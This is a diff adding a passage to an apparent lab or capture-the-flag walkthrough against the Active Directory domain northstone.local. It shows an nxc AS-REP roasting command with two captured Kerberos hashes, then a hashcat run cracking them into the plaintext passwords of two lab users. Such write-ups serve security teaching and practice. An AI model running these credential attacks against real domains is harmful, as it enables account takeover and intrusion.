@@ -417,5 +417,20 @@ bloodyAD --host dc.northstone.local -d northstone.local -u c.mcgill -p 'chuck102
 Now the user should be AS-REP roastable!
 
 ```python
-
+nxc ldap dc.northstone.local -u users.txt -p '' --asreproast asrep.hash                                
+LDAP        10.1.209.181    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (signing:None) (channel binding:Never) 
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.1.209.181    389    DC               $krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:34897bf7ea202aeff8910f4d9d7bf048$11a4739d63ec0f0c86a7c4d19bb9fdfb9f51b5fbb82ef98a75c74e5fe5aa5988affec026c54ff42ef4b8ed15a5a56ccecdf1b1cb27c192cd0bc3c6310d38b14ed7a187373dac36802a453c6098ae011b6c5a7ea09acecd0fc5257b4f5b4a1696fffd08f9e5539d4a5675313e401bd8c026e28ab8444d2595d513cb7e62880fd214f34a51ae33353556d7cb9f86e6dce4f4a294c1e6d7ba11ee35904bf0fbf861c2b4306bef0fbf44df50fb39b45bc39556a5c871852bc2480e68c99841c96ca3c23d5031d0c1e5eae724fc9cc4bbf90f54f4a3e6373d4b345a10200f388c97c51f84c03a603c2731746f2c9a33196df18e87f76b
+LDAP        10.1.209.181    389    DC               $krb5asrep$23$t.dalton@NORTHSTONE.LOCAL:73c32117161f3cd37e7907bc60731487$c688f2d08768c728a431aeb8f937011c644c61e010def8621ace5d36995c2ab23cc7cd20a84150697ce00734f989130f67c6856c8efd981fc875b73324bd5e5757d7a5940baa24bef75c265c65fd213da3e26144f28c45cd3a7f9f578ca79920227f896c944a77930fd636ea2026480202a974b23dabccfafc912289828dbb924cd3937b4b9eb1a17c284fa2c74b416b9706444c61bedee92c63d1e66f6603519edf29c34fdb07d42ec99355b0005e3589709d29eca2024bc59a1cf210eaa7c897def5525dc808c06b97d6ac7906187fb15bac43a18d7838d6e9f15465e00dae1670119449255ae7bbe8127065410d7d23dde056
 ```
+
+Now ill see if the hash will crack!
+
+```python
+hashcat asrep.hash /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$c.mcgill@NORTHSTONE.LOCAL:34897bf7ea202aeff8910f4d9d7bf048$11a4739d63ec0f0c86a7c4d19bb9fdfb9f51b5fbb82ef98a75c74e5fe5aa5988affec026c54ff42ef4b8ed15a5a56ccecdf1b1cb27c192cd0bc3c6310d38b14ed7a187373dac36802a453c6098ae011b6c5a7ea09acecd0fc5257b4f5b4a1696fffd08f9e5539d4a5675313e401bd8c026e28ab8444d2595d513cb7e62880fd214f34a51ae33353556d7cb9f86e6dce4f4a294c1e6d7ba11ee35904bf0fbf861c2b4306bef0fbf44df50fb39b45bc39556a5c871852bc2480e68c99841c96ca3c23d5031d0c1e5eae724fc9cc4bbf90f54f4a3e6373d4b345a10200f388c97c51f84c03a603c2731746f2c9a33196df18e87f76b:chuck102213
+$krb5asrep$23$t.dalton@NORTHSTONE.LOCAL:73c32117161f3cd37e7907bc60731487$c688f2d08768c728a431aeb8f937011c644c61e010def8621ace5d36995c2ab23cc7cd20a84150697ce00734f989130f67c6856c8efd981fc875b73324bd5e5757d7a5940baa24bef75c265c65fd213da3e26144f28c45cd3a7f9f578ca79920227f896c944a77930fd636ea2026480202a974b23dabccfafc912289828dbb924cd3937b4b9eb1a17c284fa2c74b416b9706444c61bedee92c63d1e66f6603519edf29c34fdb07d42ec99355b0005e3589709d29eca2024bc59a1cf210eaa7c897def5525dc808c06b97d6ac7906187fb15bac43a18d7838d6e9f15465e00dae1670119449255ae7bbe8127065410d7d23dde056:123tonyd
+```
+
